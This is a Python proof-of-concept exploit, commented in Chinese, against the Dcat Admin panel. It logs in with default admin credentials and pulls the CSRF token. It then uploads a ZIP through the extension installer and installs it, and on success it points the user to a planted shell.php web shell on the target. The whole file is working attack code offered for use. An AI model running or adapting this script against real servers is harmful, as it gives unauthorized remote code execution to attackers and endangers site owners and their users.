import re
import requests
import argparse
import sys
import os


def get_token(session, url):
    """从登录页中提取 Dcat.token"""
    print("[*] 获取 token...")
    token_pattern = r'Dcat\.token\s*=\s*"([^"]+)"'
    try:
        resp = session.get(url, timeout=10)
        match = re.search(token_pattern, resp.text)
        if match:
            token = match.group(1)
            print(f"[+] 获取到 token: {token}")
            return token
        else:
            print("[-] 未找到 token，请检查正则或网页内容")
            sys.exit(1)
    except Exception as e:
        print(f"[-] 获取 token 失败: {e}")
        sys.exit(1)


def login(session, base_url, username, password, headers):
    """登录后台"""
    login_url = f"{base_url.rstrip('/')}/admin/auth/login"
    token = get_token(session, login_url)

    login_data = {
        '_token': token,
        'username': username,
        'password': password,
    }

    print(f"[*] 尝试登录后台: {username}:{password}")
    resp = session.post(login_url, headers=headers, data=login_data)
    if "admin" in resp.url or resp.status_code == 200:
        print("[+] 登录请求已发送，请检查响应状态")
    else:
        print("[-] 登录可能失败，请检查用户名或密码")
    return get_token(session, login_url)  # 使用登录后返回新的token


def upload_extension(session, base_url, headers, token, file_path):
    """上传扩展包"""
    upload_url = f"{base_url.rstrip('/')}/admin/dcat-api/form/upload"

    if not os.path.exists(file_path):
        print(f"[-] 文件不存在: {file_path}")
        sys.exit(1)

    files = {
        "_file_": (os.path.basename(file_path), open(file_path, 'rb'), 'application/x-zip-compressed')
    }

    form_data = {
        '_id': 'uploadTest',
        '_token': token,
        'upload_column': 'extension',
        '_form_': 'Dcat\\Admin\\Http\\Forms\\InstallFromLocal',
        'name': os.path.basename(file_path),
        'size': str(os.path.getsize(file_path))
    }

    print("[*] 上传扩展文件中...")
    resp = session.post(upload_url, headers=headers, files=files, data=form_data)
    try:
        res_json = resp.json()
        ext_id = res_json['data']['id']
        print(f"[+] 上传成功，扩展 ID: {ext_id}")
        return ext_id
    except Exception:
        print(f"[-] 上传失败，响应内容: {resp.text}")
        sys.exit(1)


def install_extension(session, base_url, headers, token, ext_id):
    """执行扩展解析与安装"""
    parse_url = f"{base_url.rstrip('/')}/admin/dcat-api/form"
    parse_data = {
        'extension': ext_id,
        '_file_': '',
        '_form_': 'Dcat\\Admin\\Http\\Forms\\InstallFromLocal',
        '_current_': f"{base_url.rstrip('/')}/admin/auth/extension",
        '_payload_': '{"_current_":"http://example.com/admin/auth/extensions?","renderable":"Dcat_Admin_Http_Forms_InstallFromLocal"}',
        '_token': token
    }

    print("[*] 开始安装扩展...")
    resp = session.post(parse_url, headers=headers, data=parse_data)
    try:
        res_json = resp.json()
        if res_json['data'].get('type') == 'success':
            print("[+] 扩展安装成功 ✅ 请访问shell文件："+base_url+"/shell.php")
        else:
            print("[-] 扩展安装失败 ❌")
            print(res_json)
    except Exception:
        print(f"[-] 解析响应失败: {resp.text}")


def main():
    parser = argparse.ArgumentParser(description="Dcat Admin 插件上传 POC")
    parser.add_argument("-u", "--url", required=True, help="目标网站URL，例如：http://dcatadmin.com")
    parser.add_argument("-U", "--username", default="admin", help="Login username")
    parser.add_argument("-P", "--password", default="admin", help="Login password")
    parser.add_argument("-f", "--file", default="operation-log.zip", help="要上传的ZIP文件路径（默认 operation-log.zip）")

    args = parser.parse_args()

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'
    }

    with requests.Session() as s:
        token = login(s, args.url, args.username, args.password, headers)
        ext_id = upload_extension(s, args.url, headers, token, args.file)
        install_extension(s, args.url, headers, token, ext_id)


if __name__ == "__main__":
    main()
